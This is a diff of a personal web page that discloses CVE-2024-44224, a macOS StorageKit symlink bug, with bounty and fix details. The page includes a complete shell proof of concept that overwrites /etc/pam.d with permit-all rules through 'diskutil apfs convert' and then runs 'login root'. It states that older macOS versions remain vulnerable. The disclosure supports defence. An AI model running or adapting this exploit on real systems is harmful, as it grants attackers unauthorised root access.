@@ -1,15 +1,13 @@
-<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="initial-scale=1"><link rel="stylesheet" href="/style.css"><link rel="icon" href="/icon.png"><title>amy's website</title></head><body><div class="top"><h1><a href="/">amy's website</a></h1><p><a href="https://github.com/asentientbot" target="_blank">github</a> / <a href="https://asentientbot.ca/@a" target="_blank">fedi</a> / <a href="mailto:asentientbot@gmail.com">email</a></p></div><div><h2>StorageKit bug</h2><p>Before actually converting from HFS+, <code>diskutil apfs convert</code> puts legacy boot files in a "staging" folder passed with <code>-prebootSource</code>. The copying is done by <code>storagekitd</code> (as root), and it follows symlinks, allowing <b>arbitrary file write</b>. This can <a href="https://packetstorm.news/files/id/159084" target="_blank">easily escalate privileges</a>.</p><p>After reporting the bug in September 2024, I received an Apple Security Bounty, and it was fixed in <a href="https://support.apple.com/en-ca/121842" target="_blank">macOS 13.7.2</a>, <a href="https://support.apple.com/en-ca/121840" target="_blank">macOS 14.7.2</a>, and <a href="https://support.apple.com/en-ca/121839" target="_blank">macOS 15.2</a>:</p><pre><code>Impact: A malicious app may be able to gain root privileges
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="initial-scale=1"><link rel="stylesheet" href="/style.css"><link rel="icon" href="/icon.png"><title>amy's website</title></head><body><div class="top"><h1><a href="/">amy's website</a></h1><p><a href="https://github.com/asentientbot" target="_blank">github</a> / <a href="https://asentientbot.ca/@a" target="_blank">fedi</a> / <a href="mailto:asentientbot@gmail.com">email</a></p></div><div><h2>StorageKit bug</h2><p>Before actually converting from HFS+, <code>diskutil apfs convert</code> copies legacy boot files to a "staging" folder passed with <code>-prebootSource</code>. It's done by <code>storagekitd</code> (as root), and it followed symlinks in some versions, allowing <b>arbitrary file write</b>. This could <a href="https://packetstorm.news/files/id/159084" target="_blank">easily escalate privileges</a>.</p><p>After reporting the bug in September 2024, I received an Apple Security Bounty, and it was fixed in <a href="https://support.apple.com/en-ca/121842" target="_blank">macOS 13.7.2</a>, <a href="https://support.apple.com/en-ca/121840" target="_blank">macOS 14.7.2</a>, and <a href="https://support.apple.com/en-ca/121839" target="_blank">macOS 15.2</a>:</p><pre><code>Impact: A malicious app may be able to gain root privileges
 Description: A permissions issue was addressed with additional restrictions.
 CVE-2024-44224: Amy (@asentientbot)
-</code></pre><p>Big Sur and Monterey are still vulnerable.</p><h3>thanks</h3><p>Once again, <a href="https://x.com/916253" target="_blank">emma (916253)</a> and <a href="https://github.com/moosethegoose2213" target="_blank">ASentientHedgehog</a> helped test.</p><p>They're also really cool in general, please go follow them.</p><h3>sample code</h3><p>The following shell script will login as root on affected versions.</p><pre><code>wholeDevice=$(hdiutil attach -nomount -plist ram://10000000 | plutil -extract system-entities.0.dev-entry raw -)
-mainName=$(mktemp -u evilXXXXX)
-bootName=$(mktemp -u bootXXXXX)
-diskutil partitiondisk $wholeDevice gpt jhfs+ $mainName 1g %Apple_Boot% %noformat% r
-newfs_hfs -v $bootName ${wholeDevice}s3
-diskutil mount ${wholeDevice}s3
+</code></pre><p>Monterey and older are still vulnerable.</p><h3>thanks</h3><p>Once again, <a href="https://x.com/916253" target="_blank">emma (916253)</a> and <a href="https://github.com/moosethegoose2213" target="_blank">ASentientHedgehog</a> helped test.</p><p>They're also really cool in general, please go follow them.</p><h3>sample code</h3><p>The following shell script will login as root on affected versions.</p><pre><code>whole=$(hdiutil attach -nomount -plist ram://10000000 | plutil -extract system-entities.0.dev-entry raw -)
+diskutil partitiondisk $whole gpt jhfs+ evil_system 1g %Apple_Boot% %noformat% r
+newfs_hfs -v evil_boot ${whole}s3
+diskutil mount ${whole}s3
 
-bugInput=/Volumes/$bootName/com.apple.boot.R/System/Library/Caches/com.apple.corestorage/EFILoginLocalizations
-bugOutput=/Volumes/$mainName/staging/System/Library/Caches/com.apple.corestorage/EFILoginLocalizations
+bugInput=/Volumes/evil_boot/com.apple.boot.R/System/Library/Caches/com.apple.corestorage/EFILoginLocalizations
+bugOutput=/Volumes/evil_system/staging/System/Library/Caches/com.apple.corestorage/EFILoginLocalizations
 mkdir -p $bugInput
 mkdir -p $(dirname $bugOutput)
 
@@ -18,7 +16,7 @@ account sufficient pam_permit.so
 session sufficient pam_permit.so' &gt; $bugInput/login
 ln -s /etc/pam.d $bugOutput
 
-diskutil apfs convert $mainName -prebootSource /Volumes/$mainName/staging
+diskutil apfs convert evil_system -prebootSource /Volumes/evil_system/staging
 
 login root
 </code></pre></div></body></html>
